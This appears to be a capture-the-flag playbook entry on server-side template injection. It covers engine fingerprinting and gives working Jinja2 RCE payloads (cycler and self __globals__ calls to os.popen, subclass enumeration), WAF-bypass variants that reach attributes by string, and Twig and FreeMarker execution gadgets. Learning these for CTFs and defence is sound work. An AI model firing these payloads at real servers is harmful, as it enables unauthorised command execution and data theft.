---
id: ssti-template-injection
category: WEB
tags: [ssti, template-injection, jinja2, twig, flask, server-side, rce, polyglot, 7x7, mro, cycler]
tools: []
manuals: []
title: "SSTI: Server-Side Template Injection (Jinja2 → RCE)"
difficulty: medium
created: 2026-10-04
updated: 2026-10-04
related: []
---

## How to recognize this pattern

- Your input is **reflected** in the page and the app looks like it renders a template (Flask/Jinja2,
  Node, PHP Twig). Name, error message, "preview", personalized greeting (`Hello, <input>`).
- The polyglot `${{<%[%'"}}%\` triggers a template error; a math test confirms the engine:
  - `{{7*7}}` → `49` ⇒ Jinja2/Twig (Python/PHP)
  - `${7*7}` → `49` ⇒ FreeMarker/Thymeleaf/JSP
  - `#{7*7}` → Ruby/others

## Method

### 1. Confirm + identify the engine
Send `{{7*7}}`. If it returns `49`, it's Jinja-like. To tell Jinja2 (Python) from Twig (PHP):
`{{7*'7'}}` → `7777777` in Jinja2, `49` in Twig.

### 2. Jinja2 (Flask) → RCE
```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag*').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}   # list classes to find Popen/os
```
Read the flag directly: `{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}`.

### 3. If a WAF blocks `_`/`.`/`[`: attributes by string
```jinja
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
```

## Gotchas

- **Don't confuse it with XSS**: `{{7*7}}` rendering `49` is SSTI (the server evaluates it); if literal
  `{{7*7}}` shows up but `<b>x</b>` renders, it's XSS (client), a different vector.
- The `__mro__` index and the `Popen`/`os._wrap_close` subclass **vary by Python version**, so
  prefer the `cycler`/`request` gadget (stable) over indexing `__subclasses__()` by hand.
- Twig/FreeMarker have their own RCE payloads (`{{['id']|filter('system')}}` in Twig,
  `freemarker.template.utility.Execute` in FreeMarker); identify the engine first.
- A template sandbox may block some gadgets; test more than one `__globals__` path.

## Cross-reference

- If the input isn't evaluated but becomes a shell command → `command-injection`.
- Payload toolkit per engine: PayloadsAllTheThings (grab it offline beforehand).
